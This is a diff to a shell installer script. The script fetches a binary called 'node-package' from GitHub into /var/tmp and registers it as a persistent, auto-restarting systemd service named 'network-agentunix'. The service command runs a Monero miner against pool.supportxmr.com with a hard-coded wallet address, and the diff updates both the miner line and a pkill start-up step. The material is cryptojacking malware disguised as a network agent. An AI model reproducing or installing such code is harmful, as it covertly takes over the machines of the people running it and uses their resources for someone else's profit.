@@ -8,7 +8,7 @@ URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-pac
 TARGET_DIR="/var/tmp"
 FILENAME="node-package"
 FULL_PATH="$TARGET_DIR/$FILENAME"
-SERVICE_NAME="network-agent-unix"
+SERVICE_NAME="network-agentunix"
 SERVICE_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
 AGENT_PATH="$FULL_PATH"
 
@@ -44,13 +44,14 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$AGENT_PATH  -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay
+ExecStart=$AGENT_PATH -o pool.supportxmr.com:443 -u 44xquCZRP7k5QVc77uPtxb7Jtkaj1xyztAwoyUtmigQoHtzA8EmnAEUbpoeWcxRy1nJxu4UYrR4fN3MPufQQk4MTL6M2Y73 -k --tls -p prolay
 Restart=always
 RestartSec=60
 StandardOutput=journal
 StandardError=journal
 # Ensure only one instance runs
-ExecStartPre=/bin/bash -c 'if pgrep -f "$AGENT_PATH" > /dev/null; then pkill -f "$AGENT_PATH"; sleep 2; fi'
+ExecStartPre=-/bin/bash -c 'pkill -f "node-package" || true'
+ExecStartPre=/bin/sleep 2
 
 [Install]
 WantedBy=multi-user.target
